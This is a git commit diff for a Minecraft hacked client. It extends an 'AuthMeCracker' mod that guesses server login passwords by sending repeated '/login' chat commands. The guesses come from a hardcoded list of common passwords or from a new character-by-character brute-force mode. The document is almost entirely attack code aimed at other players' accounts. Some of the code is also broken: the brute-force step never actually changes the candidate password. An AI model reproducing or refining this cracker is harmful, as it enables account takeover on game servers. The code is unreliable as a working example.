e53a9214e68a80accd2feef59c4b6bdd97861cc0
chrissx <chrissx@chrissx.ga>
2019-06-08 17:08:26 +0200

    added a brute force mode to the authmecracker.

--- src/minecraft/de/chrissx/mods/chat/AuthMeCrack.java
+++ src/minecraft/de/chrissx/mods/chat/AuthMeCrack.java
@@ -16,7 +16,7 @@ import de.chrissx.util.Util;
 
 public class AuthMeCrack extends Mod {
 
-	public static final String[] DEFAULT_AUTHME = {
+	public static final String[] DEFAULT_PASSWORDS = {
 			"password", "passwort", "password1", "passwort1",
 			"password123", "passwort123", "pass", "pw",
 			"pw1", "pw123", "123", "1234", "12345",
@@ -30,20 +30,31 @@ public class AuthMeCrack extends Mod {
 			"auth", "authme", "qwerty", "qwertz",
 			"ficken", "ficken1", "ficken12", "ficken123",
 			"fuck", "fuckme", "fuckyou" };
+	
+	public static final Character[] DEFAULT_CHARS =
+	{
+		'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b',
+		'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+		'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
+		'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
+		'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
+		'Y', 'Z'
+	};
 
 	List<String> pws;
-
+	List<Character> crs;
 	File pwFile = Paths.get(Consts.configPath, "authmecracker.cfg").toFile();
-
+	File crFile = Paths.get(Consts.configPath, "authmecrackchars.cfg").toFile();
 	int times = 0;
+	PasswordCrackMode mode = PasswordCrackMode.DICT;
+	String bfPw;
 
 	public AuthMeCrack() {
 		super("AuthMeCracker");
-		if(pwFile.exists()) {
+		if(pwFile.exists())
 			try {
 				List<String> pwsL = new ArrayList<String>();
-				BufferedReader reader;
-				reader = new BufferedReader(new FileReader(pwFile));
+				BufferedReader reader = new BufferedReader(new FileReader(pwFile));
 				String s = "";
 				while((s = reader.readLine()) != "" && s != null)
 					pwsL.add(s);
@@ -52,45 +63,144 @@ public class AuthMeCrack extends Mod {
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
-		}else
-			pws = Arrays.asList(DEFAULT_AUTHME);
+		else
+			pws = Arrays.asList(DEFAULT_PASSWORDS);
+		
+		if(crFile.exists())
+			try {
+				List<Character> crsL = new ArrayList<Character>();
+				BufferedReader reader = new BufferedReader(new FileReader(crFile));
+				int i;
+				while((i = reader.read()) != -1)
+					crsL.add((char)i);
+				reader.close();
+				crs = crsL;
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
+		else
+			crs = Arrays.asList(DEFAULT_CHARS);
 	}
 
 	@Override
 	public void onTick() {
-		if(enabled && times != 0) {
-			Util.sendChat("/login " + pws.get(times - 1));
-			times--;
+		if(enabled && times > 0) {
+			if(mode == PasswordCrackMode.DICT)
+			{
+				Util.sendChat("/login " + pws.get(times - 1));
+				times--;
+			}
+			else if(mode == PasswordCrackMode.BRUTE_FORCE)
+			{
+				bf_stuff bf = bruteForceRound();
+				Util.sendChat("/login " + bf.pw);
+				enabled = bf.more;
+			}
+			else
+				Util.sendMessage("[AuthMeCrack]Unrecognized PasswordCrackMode!");
 		}else {
 			enabled = false;
 			times = 0;
 		}
 	}
+	
+	class bf_stuff
+	{
+		String pw;
+		boolean more;
+		bf_stuff(String pw, boolean more)
+		{
+			this.pw = pw;
+			this.more = more;
+		}
+	}
+	
+	void replaceCharAt(String s, int i, char c)
+	{
+		s = s.substring(0, i) + c + s.substring(i + 1);
+	}
+	
+	bf_stuff bruteForceRound()
+	{
+		if(bfPw.charAt(0) == crs.get(crs.size() - 1))
+			return new bf_stuff(bfPw, false);
+		String s = bfPw;
+		int i;
+		for(i = bfPw.length() - 1; i > -1 && bfPw.charAt(i) == crs.get(crs.size() - 1); i--);
+		replaceCharAt(bfPw, i, crs.get(crs.indexOf(bfPw.charAt(i)) + 1));
+		for(i++; i < bfPw.length(); i++)
+			replaceCharAt(bfPw, i, crs.get(0));
+		return new bf_stuff(s, true);
+	}
 
 	@Override
 	public void toggle() {
 		enabled = true;
-		times = pws.size();
+		if(mode == PasswordCrackMode.DICT)
+			times = pws.size();
+		else if(mode == PasswordCrackMode.BRUTE_FORCE)
+			bfPw = "00000000";
 	}
 
 	@Override
 	public void onStop() {
 		try {
 			if(!pwFile.exists()) pwFile.createNewFile();
-			if(pws.size() == 0) return;
-			BufferedWriter writer = new BufferedWriter(new FileWriter(pwFile));
-			writer.write(pws.get(0));
-			for(int i = 1; i < pws.size(); i++) {
-				writer.newLine();
-				writer.write(pws.get(i));
+			if(pws.size() != 0)
+			{
+				BufferedWriter writer = new BufferedWriter(new FileWriter(pwFile));
+				writer.write(pws.get(0));
+				for(int i = 1; i < pws.size(); i++) {
+					writer.newLine();
+					writer.write(pws.get(i));
+				}
+				writer.close();
 			}
-			writer.close();
+			if(!crFile.exists()) crFile.createNewFile();
+			if(crs.size() != 0)
+			{
+				BufferedWriter writer = new BufferedWriter(new FileWriter(crFile));
+				for(char c : crs)
+					writer.write(c);
+				writer.close();
+			}
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
 	}
+	
+	@Override
+	public void processCommand(String[] args)
+	{
+		if(args.length == 1) toggle();
+		else if(args[1].equalsIgnoreCase("mode"))
+			try {
+				mode = PasswordCrackMode.parse(args[2]);
+			} catch (Exception e) {
+				Util.sendMessage("Unable to parse mode: " + e.getMessage());
+			}
+		else if(args[1].equalsIgnoreCase("addpw"))
+			try {
+				addPw(args[2]);
+			} catch (Exception e) {
+				Util.sendMessage("Unable to add password: " + e.getMessage());
+			}
+		else if(args[1].equalsIgnoreCase("addcr"))
+			try {
+				addCr(args[2].charAt(0));
+			} catch (Exception e) {
+				Util.sendMessage("Unable to add char: " + e.getMessage());
+			}
+		else
+			Util.sendMessage("Unknown command (#authmecrack, #authmecrack mode [passwordcrackingmode], #authmecrack addpw [string], #authmecrack addcr [char]");
+	}
 
 	public void addPw(String pw) {
 		pws.add(pw);
+	}
+	
+	public void addCr(char cr)
+	{
+		crs.add(cr);
 	}
 }
---
+++ src/minecraft/de/chrissx/mods/chat/PasswordCrackMode.java
@@ -0,0 +1,34 @@
+package de.chrissx.mods.chat;
+
+public enum PasswordCrackMode {
+
+	DICT(0),
+	BRUTE_FORCE(1);
+	
+	public final int id;
+	
+	PasswordCrackMode(int id)
+	{
+		this.id = id;
+	}
+	
+	public static PasswordCrackMode parse(String s) throws NumberFormatException, Exception
+	{
+		if(s.toUpperCase().startsWith("DICT"))
+			return DICT;
+		else if(s.toUpperCase().startsWith("BRUTE"))
+			return BRUTE_FORCE;
+		else
+			return match(Integer.parseInt(s));
+	}
+	
+	public static PasswordCrackMode match(int id) throws Exception
+	{
+		if(id == 0)
+			return DICT;
+		else if(id == 1)
+			return BRUTE_FORCE;
+		else
+			throw new Exception("Can't match id " + id + " to a PasswordCrackMode.");
+	}
+}
